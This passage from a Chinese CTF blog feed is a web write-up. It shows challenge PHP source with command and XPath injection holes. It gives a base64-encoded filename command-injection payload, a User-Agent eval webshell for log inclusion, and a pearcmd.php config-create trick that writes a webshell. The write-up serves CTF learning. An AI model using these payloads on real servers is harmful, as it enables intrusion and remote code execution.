class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">session_start</span>();</span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="variable">$size</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="language-php">    </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyPicDisk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;form method=&quot;POST&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">&#x27;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &#x27;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span></span><br><span class="line"><span class="language-php">          &#125;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>分析源码</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果不存在session[<span class="string">&#x27;user&#x27;</span>]，出现登录表单，提交表单之后就会给session[<span class="string">&#x27;user&#x27;</span>]进行赋值。</span><br><span class="line">第一次登录后再回到原表单就会触发js提示不是<span class="literal">admin</span>，并获得源码文件的位置，进入下一个if</span><br><span class="line"></span><br><span class="line">如果不存在<span class="keyword">file</span>，那就触发文件上传表单，action为index.php，如果存在上传文件，那么就对文件后缀进行判断并返回上传成功提示</span><br><span class="line">如果存在<span class="keyword">file</span>，那么就将文件名赋值给<span class="variable">$filename</span>，然后引用<span class="keyword">FILE</span>类对文件名进行处理，construct主要是过滤了/和多个.，且判断了文件是否存在，如果文件存在，那么就执行<span class="params">system</span>函数</span><br></pre></td></tr></table></figure><p>具体操作<img src="../笔记图/image-20230722205634843.png" alt=""></p><p><img src="../笔记图/image-20230722205650142.png" alt="image-20230722205650142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2f3204e1-d884-4172-86aa-0ac751e580de.node4.buuoj.cn:81/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">写表单进行登录和文件上传，上传文件之后再用另一个界面进行<span class="built_in">get</span>传<span class="built_in">file</span>，传入的<span class="built_in">file</span>名必须和上传的文件名是一样的，进而触发<span class="keyword">system</span>命令执行。</span><br><span class="line">由于对/和.具有严格过滤，所以这里采用编码绕过</span><br><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br><span class="line">bp传参需要把空格改为+号</span><br></pre></td></tr></table></figure><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看到是个网页直接盲猜一手后台管理界面/admin，然后弱口令试了一下就进去了</span><br></pre></td></tr></table></figure><p><img src="../笔记图/image-20230722211756542.png" alt="image-20230722211756542"></p><p>这里是有一个任意文件读取漏洞，but好像没什么卵用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后就想是否可以进行日志包含</span><br><span class="line">添加UA：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chuling]); <span class="meta">?&gt;</span></span><br><span class="line">然后访问url:   url/admin/r=../../../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">用蚁剑尝试连接，结果失败了。</span><br></pre></td></tr></table></figure><p>这时候就又来了一个pearcmd.php文件包含</p><p>参考博客：<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">具体操作为?+config-create+<span class="regexp">/&amp;r=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/share/</span>php<span class="regexp">/pearcmd&amp;/</span>&lt;?=eval(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>chuling2.php</span><br><span class="line"></span><br><span class="line">成功之后直接蚁剑连接得到flag</span><br></pre></td></tr></table></figure><p><img src="../笔记图/image-20230722214619617.png" alt="image-20230722214619617"></p>]]></content>
    
    
    <summary type="html">DASCTF wp来咯~ web 3/5</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
</feed>
